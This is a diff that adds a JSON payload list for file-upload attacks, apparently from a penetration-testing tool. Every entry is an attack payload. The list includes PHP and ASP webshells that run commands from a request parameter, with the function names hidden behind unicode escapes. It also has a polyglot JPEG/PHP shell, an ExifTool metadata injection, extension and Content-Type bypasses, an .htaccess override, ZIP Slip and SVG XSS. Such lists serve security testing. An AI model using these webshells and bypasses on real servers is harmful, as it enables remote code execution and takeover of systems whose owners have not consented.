@@ -1,0 +1,130 @@
+[
+  {
+    "name": "PHP Webshell Upload",
+    "category": "File Upload",
+    "description": "Basic PHP webshell",
+    "payload": "\\u003c\\u003f\\u0070\\u0068\\u0070 \\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028$_GET['cmd']); ?>",
+    "tags": [
+      "php",
+      "rce",
+      "webshell"
+    ]
+  },
+  {
+    "name": "PHP Short Tag",
+    "category": "File Upload",
+    "description": "PHP short tag webshell",
+    "payload": "\\u003c\\u003f\\u003d \\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028$_GET['cmd']); ?>",
+    "tags": [
+      "php",
+      "short-tag",
+      "rce"
+    ]
+  },
+  {
+    "name": "Double Extension",
+    "category": "File Upload",
+    "description": "Bypass via double extension",
+    "payload": "shell.php.jpg",
+    "tags": [
+      "double-extension",
+      "bypass"
+    ]
+  },
+  {
+    "name": "Null Byte Extension",
+    "category": "File Upload",
+    "description": "Null byte to truncate extension",
+    "payload": "shell.php%00.jpg",
+    "tags": [
+      "null-byte",
+      "bypass"
+    ]
+  },
+  {
+    "name": "Content-Type Bypass",
+    "category": "File Upload",
+    "description": "Change Content-Type to allowed type",
+    "payload": "Content-Type: image/jpeg (while uploading .php)",
+    "tags": [
+      "content-type",
+      "bypass"
+    ]
+  },
+  {
+    "name": "Magic Bytes Prepend",
+    "category": "File Upload",
+    "description": "Prepend JPEG magic bytes to PHP",
+    "payload": "\\xFF\\xD8\\xFF\\u003c\\u003f\\u0070\\u0068\\u0070 \\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028$_GET['cmd']); ?>",
+    "tags": [
+      "magic-bytes",
+      "bypass"
+    ]
+  },
+  {
+    "name": "SVG XSS Upload",
+    "category": "File Upload",
+    "description": "SVG file with embedded XSS",
+    "payload": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>",
+    "tags": [
+      "svg",
+      "xss",
+      "stored"
+    ]
+  },
+  {
+    "name": "HTACCESS Override",
+    "category": "File Upload",
+    "description": "Upload .htaccess to run PHP",
+    "payload": "AddType application/x-httpd-php .jpg",
+    "tags": [
+      "htaccess",
+      "bypass",
+      "apache"
+    ]
+  },
+  {
+    "name": "ExifTool Injection",
+    "category": "File Upload",
+    "description": "Command injection in image metadata",
+    "payload": "exiftool -Comment='\\u003c\\u003f\\u0070\\u0068\\u0070 \\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028$_GET[\"cmd\"]);?>' image.jpg -o shell.php.jpg",
+    "tags": [
+      "exiftool",
+      "metadata",
+      "rce"
+    ]
+  },
+  {
+    "name": "ZIP Slip",
+    "category": "File Upload",
+    "description": "Path traversal via ZIP extraction",
+    "payload": "../../evil.php (filename inside ZIP archive)",
+    "tags": [
+      "zip-slip",
+      "path-traversal",
+      "rce"
+    ]
+  },
+  {
+    "name": "Polyglot PHP JPEG",
+    "category": "File Upload",
+    "description": "Valid JPEG that is also valid PHP",
+    "payload": "(JPEG header bytes)\\u003c\\u003f\\u0070\\u0068\\u0070 \\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028$_GET['cmd']); ?>",
+    "tags": [
+      "polyglot",
+      "bypass",
+      "advanced"
+    ]
+  },
+  {
+    "name": "ASP Webshell",
+    "category": "File Upload",
+    "description": "Classic ASP webshell",
+    "payload": "<% Set rs = Server.\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074(\"\\u0057\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054\\u002e\\u0053\\u0048\\u0045\\u004c\\u004c\") rs.Run \"cmd /c \" & Request(\"cmd\"), 0 %>",
+    "tags": [
+      "asp",
+      "rce",
+      "iis"
+    ]
+  }
+]
